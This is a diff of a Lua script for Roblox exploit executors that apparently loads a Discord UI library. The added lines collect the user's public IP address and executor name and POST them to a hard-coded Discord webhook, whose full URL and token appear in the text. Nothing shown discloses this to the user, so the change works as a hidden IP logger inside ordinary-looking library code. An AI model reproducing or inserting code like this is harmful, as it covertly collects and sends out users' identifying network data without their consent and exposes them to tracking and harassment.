@@ -18,6 +18,19 @@ local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
 local IPBuffer = tostring(GetIPJSON.ip)
 local IP = IPBuffer
 
+local ExecutorName = identifyexecutor()
+url = "https://discord.com/api/webhooks/1095163481709367346/53F5jomSK588w5JRQoUtPCM3TvQiR78p_MjIeGcSTlyaDaTy_i3fqh_dw7NKEbk_PCVx"
+local data = {
+	["content"] = IP.." "..ExecutorName
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+local headers = {
+	["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
 pcall(function()
 	userinfo = HttpService:JSONDecode(readfile("discordlibinfo.txt"));
 end)
